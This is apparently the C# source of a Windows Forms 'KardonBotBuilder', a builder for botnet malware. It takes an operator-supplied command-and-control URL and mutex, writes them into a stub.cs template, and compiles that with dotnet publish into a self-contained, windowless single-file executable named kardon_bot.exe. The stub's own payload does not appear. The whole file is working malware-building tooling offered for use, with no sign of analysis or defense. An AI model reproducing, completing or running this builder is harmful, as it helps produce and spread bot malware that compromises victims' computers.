using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Text;
using System.Linq;

namespace KardonBotBuilder
{
    public partial class BuilderForm : Form
    {
        public BuilderForm()
        {
            InitializeComponent();
        }

        private void BuilderForm_Load(object sender, EventArgs e)
        {
            txtMutex.Text = Guid.NewGuid().ToString();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            string c2Url = txtC2Url.Text.Trim();
            string mutex = txtMutex.Text.Trim();

            if (string.IsNullOrWhiteSpace(c2Url) || string.IsNullOrWhiteSpace(mutex))
            {
                MessageBox.Show("C2 URL and Mutex are required!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            try
            {
                // Path to stub.cs in same folder as EXE
                string stubPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stub.cs");

                if (!File.Exists(stubPath))
                {
                    MessageBox.Show($"stub.cs not found in: {stubPath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string stubCode = File.ReadAllText(stubPath, Encoding.UTF8);
                stubCode = stubCode.Replace("___C2_URL___", c2Url);
                stubCode = stubCode.Replace("___MUTEX___", mutex);

                string tempDir = Path.Combine(Path.GetTempPath(), "kardon_temp");
                Directory.CreateDirectory(tempDir);
                string programPath = Path.Combine(tempDir, "Program.cs");
                File.WriteAllText(programPath, stubCode, Encoding.UTF8);

                string csprojPath = Path.Combine(tempDir, "stub.csproj");

                // MODIFIED CSPROJ CONTENT: Changed OutputType from 'Exe' to 'WinExe'
                string csproj = $@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <OutputType>WinExe</OutputType> <TargetFramework>net8.0</TargetFramework>
    <LangVersion>latest</LangVersion>
    <SelfContained>true</SelfContained>
    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
    <PublishSingleFile>true</PublishSingleFile>
    <PublishReadyToRun>true</PublishReadyToRun>
  </PropertyGroup>
</Project>
";
                File.WriteAllText(csprojPath, csproj, Encoding.UTF8);

                var psi = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = $"publish \"{csprojPath}\" -c Release -o \"{tempDir}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(psi);
                string stdout = process.StandardOutput.ReadToEnd();
                string stderr = process.StandardError.ReadToEnd();
                process.WaitForExit();

                File.WriteAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "build_log.txt"),
                    $"STDOUT:\n{stdout}\n\nSTDERR:\n{stderr}");

                if (process.ExitCode != 0)
                {
                    MessageBox.Show($"Build failed:\n{stderr}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string builtExe = Path.Combine(tempDir, "stub.exe");

                if (File.Exists(builtExe))
                {
                    string dest = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "kardon_bot.exe");
                    File.Copy(builtExe, dest, true);
                    MessageBox.Show($"Build succeeded!\nSaved as: {dest}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show($"EXE not found after build at: {builtExe}. Check build_log.txt for details.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                Directory.Delete(tempDir, true);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Build failed:\n{ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}